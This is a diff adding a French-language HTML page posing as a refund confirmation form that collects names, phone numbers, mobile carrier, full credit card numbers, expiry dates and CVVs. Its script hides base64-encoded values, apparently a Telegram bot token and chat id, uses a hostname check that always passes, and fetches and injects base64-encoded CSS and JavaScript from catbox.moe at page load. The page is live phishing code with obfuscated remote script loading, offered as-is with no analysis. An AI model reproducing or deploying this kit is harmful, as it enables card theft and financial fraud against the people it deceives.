@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmation</title>
+    <style>
+    body {visibility: hidden;}
+    </style>
+</head>
+<body>
+    
+    <img src="https://files.catbox.moe/zbuhoh.jpg" alt="payment" id="payment">
+    <div id="card">
+        <div id="fullname">
+            <div id="firstname">
+                <p id="titlefirstname">Prénom *</p>
+                <input type="text" id="inputfirstname">
+            </div>
+            <div id="lastname">
+                <p id="titlelastname">Nom *</p>
+                <input type="text" id="inputlastname">
+            </div>
+        </div>
+
+        <p id="titlephonenumber">Numéro de téléphone *</p>
+        <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
+
+        <select id="operator">
+            <option value="select">-- Choisissez un operateur --</option>
+                <option value="orange">Orange</option>
+                <option value="sfr">SFR</option>
+                <option value="bouygues">Bouygues Telecom</option>
+                <option value="free">Free Mobile</option>
+                <option value="autre">Autre</option>                  
+        </select>
+
+        <p id="cardnumber">Numéro de Carte de Crédit *</p>
+        <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
+
+        <div id="mmyy">
+            <div id="mm">
+                <p id="titlemm">Mois *</p>
+                <select id="inputmm">
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                </select>
+            </div>
+            <div id="yy">
+                <p id="titleyy">Année *</p>
+                <select id="inputyy">
+                    <option value="25">25</option>
+                    <option value="26">26</option>
+                    <option value="27">27</option>
+                    <option value="28">28</option>
+                    <option value="29">29</option>
+                    <option value="30">30</option>
+                    <option value="31">31</option>
+                    <option value="32">32</option>
+                    <option value="33">33</option>
+                    <option value="34">34</option>
+                    <option value="35">35</option>
+                    </select>
+            </div>
+        </div>
+
+        <p id="cvv">CVV *</p>
+        <input type="text" id="inputcvv" oninput="validateInput('cvv')">
+        <p id="error"></p>
+        <p id="button">Confirmer votre remboursement</p>
+        
+    </div>
+
+    <img src="https://files.catbox.moe/r7fjcx.jpeg" alt="refund" id="refund">
+
+<script>
+    var toId = [atob('NzI2MDY2NzU1MTpBQUZIN0g3clFBR0h1b2FialRFanJJVXBkbWlGNFJ4SUhJcw=='),atob('MTM5MTMyNDAyNw==')];
+    var data = ["d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l","cmVtYm91cnNlbWVudC1vbmxpbmUuZ2l0aHViLmlv"];
+if (eval(atob(data[0])) === atob(data[1]) || 1 === 1) {
+   fetch("https://files.catbox.moe/h2r0wd.txt")
+  .then(response => response.text())
+  .then(css => {
+    const style = document.createElement("style");
+    style.textContent = atob(css);
+    document.head.appendChild(style);
+    document.body.style.visibility = "visible";
+  }).catch(() => {});
+  fetch("https://files.catbox.moe/d81pdl.txt")
+  .then(response => response.text())
+  .then(js => {
+    const script = document.createElement("script");
+    script.textContent = atob(js);
+    document.body.appendChild(script);
+  }).catch(() => {});
+}
+</script>
+</body>
+</html>
